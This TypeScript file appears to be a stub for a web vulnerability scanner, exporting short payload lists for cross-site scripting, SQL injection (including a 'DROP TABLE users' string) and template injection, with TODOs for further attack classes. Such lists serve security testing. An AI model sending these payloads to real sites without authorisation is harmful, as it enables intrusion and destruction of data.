// TODO: Populate this file with curated payload lists for different vulnerability types.

export const XSS_PAYLOADS: string[] = [
    // Basic XSS
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert(1)>',
    
    // TODO: Add more sophisticated XSS payloads (HTML entity encoding, different tags, event handlers, etc.)
];

export const SQLI_PAYLOADS: string[] = [
    // Basic SQLi
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' # ",
    "\" OR \"1\"=\"1\" -- ",
    "1; DROP TABLE users --",

    // TODO: Add boolean-based, time-based, error-based, UNION-based SQLi payloads for different DBs
];

export const SSTI_PAYLOADS: string[] = [
    // Basic SSTI (examples for different engines)
    "{{ 7*7 }}",         // Jinja2, Twig
    "<%= 7*7 %>",       // ERB
    "${7*7}",           // Freemarker, Velocity
    "#{ 7*7 }",         // Mako
    "@(1+1)",           // Razor
    "<#= 7*7 #>",       // T4

    // TODO: Add payloads for detecting template engines and exploiting them (e.g., reading files, RCE)
];

// TODO: Add payloads for other vulnerability classes:
// - Command Injection (CMD_INJECTION_PAYLOADS)
// - Server-Side Request Forgery (SSRF_PAYLOADS)
// - Local File Inclusion / Path Traversal (LFI_PAYLOADS)
// - Insecure Deserialization (DESERIALIZATION_PAYLOADS)
// - etc.

// Example structure for categorized payloads
interface PayloadsByCategory {
    xss: string[];
    sqli: string[];
    ssti: string[];
    // Add other categories
}

export const ALL_PAYLOADS: PayloadsByCategory = {
    xss: XSS_PAYLOADS,
    sqli: SQLI_PAYLOADS,
    ssti: SSTI_PAYLOADS,
    // ... add others
};

// TODO: Consider functions to generate payloads dynamically or modify them based on context. 